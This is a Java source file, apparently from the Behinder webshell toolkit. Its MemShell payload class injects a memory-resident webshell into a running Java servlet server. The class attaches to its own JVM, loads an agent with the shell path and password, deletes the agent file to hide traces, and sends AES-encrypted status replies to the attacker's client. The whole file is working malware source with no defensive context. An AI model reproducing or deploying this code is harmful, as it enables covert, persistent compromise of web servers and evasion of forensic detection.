package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class MemShell {
   public static String whatever;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;
   public static String type;
   public static String libPath;
   public static String path;
   public static String password;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var12 = false;

      ServletOutputStream so = null;
      label99: {
         try {
            var12 = true;
            this.fillContext(obj);
            if (type.equals("Agent")) {
               try {
                  this.doAgentShell();
                  result.put("status", "success");
                  result.put("msg", "MemShell Agent Injected Successfully.");
                  var12 = false;
               } catch (Exception var16) {
                  result.put("status", "fail");
                  result.put("msg", var16.getMessage());
                  var12 = false;
               }
            } else if (type.equals("Filter")) {
               var12 = false;
            } else {
               if (type.equals("Servlet")) {
               }

               var12 = false;
            }
            break label99;
         } catch (Exception var17) {
            result.put("status", "fail");
            result.put("msg", var17.getMessage());
            var12 = false;
         } finally {
            if (var12) {
               try {
                  so = this.Response.getOutputStream();
                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.flush();
                  so.close();
               } catch (Exception var13) {
               }

            }
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var14) {
         }

         return true;
      }

      try {
         so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
      } catch (Exception var15) {
      }

      return true;
   }

   public void doAgentShell() throws Exception {
      try {
         Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass("com.sun.tools.attach.VirtualMachine");
         Method attachMethod = VirtualMachineCls.getDeclaredMethod("attach", String.class);
         Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod("loadAgent", String.class, String.class);
         Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());
         loadAgentMethod.invoke(obj, libPath, base64encode(path) + "|" + base64encode(password));
      } catch (Exception var9) {
      } catch (Error var10) {
      } finally {
         (new File(libPath)).delete();
      }

   }

   private static String getCurrentPID() {
      String name = ManagementFactory.getRuntimeMXBean().getName();
      String pid = name.split("@")[0];
      return pid;
   }

   private static byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private static String base64encode(String content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   public static byte[] getFileData(String filePath) throws Exception {
      byte[] fileContent = new byte[0];
      FileInputStream fis = new FileInputStream(new File(filePath));
      byte[] buffer = new byte[10240000];

      int length;
      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
      }

      fis.close();
      return fileContent;
   }

   public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
      ByteArrayOutputStream output = new ByteArrayOutputStream();
      output.write(a);
      output.write(b);
      return output.toByteArray();
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            value = base64encode(value);
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }
}
